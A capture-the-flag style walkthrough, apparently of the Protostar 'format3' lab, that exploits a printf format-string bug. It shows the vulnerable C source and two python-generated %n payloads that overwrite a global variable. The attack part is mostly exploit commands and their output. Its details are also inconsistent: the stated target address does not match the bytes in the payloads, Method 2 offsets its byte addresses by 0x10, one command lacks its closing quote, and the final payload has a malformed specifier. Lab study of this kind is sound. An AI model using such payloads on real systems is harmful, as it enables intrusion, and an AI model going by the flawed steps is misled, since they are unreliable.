Let's take a look at the source code...

```
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int target;

void printbuffer(char *string)
{
  printf(string);
}

void vuln()
{
  char buffer[512];

  fgets(buffer, sizeof(buffer), stdin);

  printbuffer(buffer);
  
  if(target == 0x01025544) {
      printf("you have modified the target :)\n");
  } else {
      printf("target is %08x :(\n", target);
  }
}

int main(int argc, char **argv)
{
  vuln();
}
```

Looking at this code, it is essentially the same as the previous challenge. The difference this time is we have to have the target 
variable equivalent to the hex value 0x01025544, instead of 64. I will be covering two different ways on how to do this, the
first is the one that I originally used to pwn the program.

# Method 1

This version is essentially the same exploit from the last challenge recycled. First we will need to find the address of the target variable.

```
objdump -t ./format3 | grep target
0804964f g    0 .bss    00000004
```

And like that, we have the address of the global target variable which is 0x0804964f. The next piece we need to know for this exploit is how many DWORDS (4 byte segments) between where our fromat string exploit is processed, and where our input is on the stack. To do that, it is the same process that was on the previous excercise.

```
python -c 'print "0000" + ".%x"*15' | ./format3
0000.0.bffffb30.b7fd7ff4.0.0.bffffd38.804849d.bffffb30.200.b7dfd8420.bf7d8420.bffffb74.30303030.2e78252e.252e7825.78252e78
```

From the output, we can see that our input of four zeroes (30303030 in hex) is 12 dwords away. So now that we have the distance, and the address of the target variable we can go ahead and see if this exploit will work.

```
python -c 'print "\xf4\x96\x04\x08%12$n"
target is 00000004 :(
```

So that confirms that our exploit will work, we just have to get the target variable to the right value. After that exploit attempt, the value of the global int variable is interpeted as 0x00000004 which is 4 in hex. This is because we wrote a 4 byte address to the integer. The value we need to set it to is 0x01025544, which is hex for the decimal value 16930116. We can fill the difference by writing that many bytes which will be 16930116 - 4 = 16930112. We can do this by adding %16930112x between the target variable address and the format string (this exploit will take a minute to run).

```
python -c 'print "\xf4\x96\x04\x08%16930112x%12$n"' | ./format3
you have modified the target :)
```

And just like that we pwned the program.

#Method 2

This method is like the previous, except we will be writing to  multiple areas instead of just one. I covered how to get the target address and the input address in Method 1 so I'm going to skip that here. The address of the target variable is 0x0804964f, which is divided in to four bytes which with how the stack is has to be 0x0804964f, 0x0804965f, 0x0804966f 0x0804967f. Since our input begins out an offset of 12, we can give our input at 12, 13, 14, and 15 DWORDS away.  Let's prove that this will work.

```
python -c 'print "\x4f\x96\x04\x08" + "\x5f\x96\x04\x08" + "\x6f\x96\x04\x08" + "\x7f\x96\x04\x08" + "%12$n%13$n%14$n%15$n"' | ./format3
target is 10101010 :(
```

Now we can add bytes to different segments in order to change the target variable to the value we need. Keep in mind. if we add a number of bytes to one of the four segments, it adds it to all following segments. Let's start doing the math, with the first segment (which is the least significant bit). The least significant bit we need is 0x44 (hex for the decimal 68), which we currently have is 0x10 (hex for the decimal 16). 0x44 - 0x10 = 0x34 (hex for 52). So for the first segment we will just need to add 52 bytes.

For the second segment we start off with 0x44, and we need 0x55 (which is hex for 85). 0x55 - 0x44 = 0x11 (Hex for 17). So we need to add 17 bytes to this segment.

For the third segment posses a problem. We start off with 0x55, howver this sgement is 0x2 (hex for two) so we can't just add bytes to make it even. What we can do is the n flag can actually overwrite into the next byte. We want the third segment to leave 0x02, and the fourth segment to leave 0x01. To do this we can set the third segment equal to 0x102 (hex for 258) whihc will accomplish this. So 0x102 - 0x55 = 0xad (hex for 173). So we just need to ad 173 bytes to the third segment, and that will take care of the third and fourth segments.

So our exploit should looke like this

```
python -c 'print "\x4f\x96\x04\x08" + "\x5f\x96\x04\x08" + "\x6f\x96\x04\x08" + "\x7f\x96\x04\x08" + "%52x%12$n" + "%17x%13$n" + "%173%14$n"' | ./format3
you have modified the target variable
```

And just like that we pwned the program.

#Sources
http://thesprawl.org/research/exploit-exercises-protostar-format/#format-2
http://the2702.com/2015/06/06/Format-3.html
